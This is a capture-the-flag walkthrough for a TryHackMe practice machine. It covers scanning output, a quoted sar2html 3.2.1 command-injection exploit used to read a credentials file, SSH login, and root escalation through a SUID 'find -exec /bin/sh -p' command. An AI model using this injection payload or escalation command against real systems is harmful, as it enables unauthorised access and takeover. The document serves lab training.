![boilerCTF](https://github.com/user-attachments/assets/ce81f037-19b0-4ba4-bb6e-70f5c75053a7)
Hi, here is how to successfully complete the machine https://tryhackme.com/room/boilerctf2
<br><br><br>

As usual, I start by scanning the target machine with nmap, we see 4 open ports
<pre><code> 
PORT      STATE  SERVICE VERSION
21/tcp    open   ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.17
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open   http    MiniServ 1.930 (Webmin httpd)
|_http-server-header: MiniServ/1.930
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel </code></pre>
<br><br><br>

I didn't find anything on the page since it's the default apache page, so I'm going to start scanning with gobuster to see if I can find anything of interest.

gobuster found me a directory /joomla/, in that directory there is nothing useful either, so I'm going to enumerate with gobuster again
<pre><code> ===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.85.174/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 313] [--> http://10.10.85.174/manual/]
/joomla               (Status: 301) [Size: 313] [--> http://10.10.85.174/joomla/]
/server-status        (Status: 403) [Size: 300]

===============================================================
Finished
=============================================================== </code></pre>
<br><br><br>

this time we did find several things we can work with, however most of them are distractions, the important directory is /_test/.
<pre><code> ===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.85.174/joomla/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/_files               (Status: 301) [Size: 320] [--> http://10.10.85.174/joomla/_files/]
/.hta                 (Status: 403) [Size: 298]
/.htaccess            (Status: 403) [Size: 303]
/.htpasswd            (Status: 403) [Size: 303]
/_test                (Status: 301) [Size: 319] [--> http://10.10.85.174/joomla/_test/]
/~www                 (Status: 301) [Size: 318] [--> http://10.10.85.174/joomla/~www/]
/administrator        (Status: 301) [Size: 327] [--> http://10.10.85.174/joomla/administrator/]
/_database            (Status: 301) [Size: 323] [--> http://10.10.85.174/joomla/_database/]
/bin                  (Status: 301) [Size: 317] [--> http://10.10.85.174/joomla/bin/]
/build                (Status: 301) [Size: 319] [--> http://10.10.85.174/joomla/build/]
/cache                (Status: 301) [Size: 319] [--> http://10.10.85.174/joomla/cache/]
/components           (Status: 301) [Size: 324] [--> http://10.10.85.174/joomla/components/]
/_archive             (Status: 301) [Size: 322] [--> http://10.10.85.174/joomla/_archive/]
/images               (Status: 301) [Size: 320] [--> http://10.10.85.174/joomla/images/]
/includes             (Status: 301) [Size: 322] [--> http://10.10.85.174/joomla/includes/]
/index.php            (Status: 200) [Size: 12478]
/installation         (Status: 301) [Size: 326] [--> http://10.10.85.174/joomla/installation/]
/language             (Status: 301) [Size: 322] [--> http://10.10.85.174/joomla/language/]
/layouts              (Status: 301) [Size: 321] [--> http://10.10.85.174/joomla/layouts/]
/libraries            (Status: 301) [Size: 323] [--> http://10.10.85.174/joomla/libraries/]
/media                (Status: 301) [Size: 319] [--> http://10.10.85.174/joomla/media/]
/modules              (Status: 301) [Size: 321] [--> http://10.10.85.174/joomla/modules/]
/plugins              (Status: 301) [Size: 321] [--> http://10.10.85.174/joomla/plugins/]
/templates            (Status: 301) [Size: 323] [--> http://10.10.85.174/joomla/templates/]
/tests                (Status: 301) [Size: 319] [--> http://10.10.85.174/joomla/tests/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.85.174/joomla/tmp/]

===============================================================
Finished
===============================================================</code></pre>
<br><br><br>

Sar2HTML is a web-based tool used to visualize and analyze system performance data collected by the sysstat package, specifically from the sar (System Activity Report) command.

Older versions of sar2html have known LFI (Local File Inclusion) vulnerabilities, allowing attackers to read system files
![2025-02-10_13-33](https://github.com/user-attachments/assets/16d3a4c7-a84b-4670-8dc5-e0cb322b56bd)
<br><br><br>

this exploit targets sar2html 3.2.1 and allows Remote Code Execution (RCE) via command injection in the plot parameter of index.php

exploit https://www.exploit-db.com/exploits/47204
<pre><code> # Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html 
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
             </code></pre>
<br><br><br>

i could do a reverse shell but it is not necessary, i just need to get the credentials found in the log.txt file.

index.php?plot=;ls
![2025-02-10_14-14](https://github.com/user-attachments/assets/42d31cd0-6844-444b-bc8c-cdd1444543dc)

<br><br><br>

index.php?plot=;cat log.txt
![2025-02-10_13-40](https://github.com/user-attachments/assets/afd8406e-0b1d-45a7-a98c-93dd4b75e3fc)
<br><br><br>


with those credentials I can log in via ssh
<pre><code> ~> ssh basterd@10.10.85.174 -p 55007
basterd@10.10.85.174's password: 
Permission denied, please try again.
basterd@10.10.85.174's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Mon Feb 10 18:16:49 2025 from 10.9.1.17
$ /bin/bash
basterd@Vulnerable:~$ 
 </code></pre>
<br><br><br>

in the backup.sh file we can find stoner's credentials
<pre><code> basterd@Vulnerable:~$ ls -la
total 16
drwxr-x--- 3 basterd basterd 4096 Aug 22  2019 .
drwxr-xr-x 4 root    root    4096 Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4096 Aug 22  2019 .cache
basterd@Vulnerable:~$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#stoner'scredentials

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
	    echo "Begining copy of" $i  >> $LOG
	    scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
	    echo $i "completed" >> $LOG
		
		if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
		   rm $SOURCE/$i
		   echo $i "removed" >> $LOG
		   echo "####################" >> $LOG
				else
					echo "Copy not complete" >> $LOG
					exit 0
		fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi </code></pre>
<br><br><br>

inside the stoner folder we can find the first flag “.secret”.
<pre><code> stoner@Vulnerable:~$ ls -la
total 20
drwxr-x--- 3 stoner stoner 4096 Feb 10 18:15 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
-rw------- 1 stoner stoner  470 Feb 10 18:15 .bash_history
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret</code></pre>
<br><br><br>

now I just need to escalate privileges to get the root flag, I'm going to look for the SUID files with this command
<pre><code> stoner@Vulnerable:~$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
-rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount
-rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount
-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
-rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap
-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
-rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap </code></pre>
<br><br><br>

checking with gtfobins I find that I can escalate privileges using the “find” command, 

uses find to run an interactive shell (/bin/sh), allowing escape from restricted environments. The -exec option runs /bin/sh, while -quit stops find after the first run, avoiding multiple instances.
![2025-02-10_13-46](https://github.com/user-attachments/assets/e5656653-b072-4530-bf13-151991198f85)
<br><br><br>


<pre><code> stoner@Vulnerable:~$ find . -exec /bin/sh -p \; -quit
bash-4.3$ ls /root/
root.txt </code></pre>
<br><br><br>

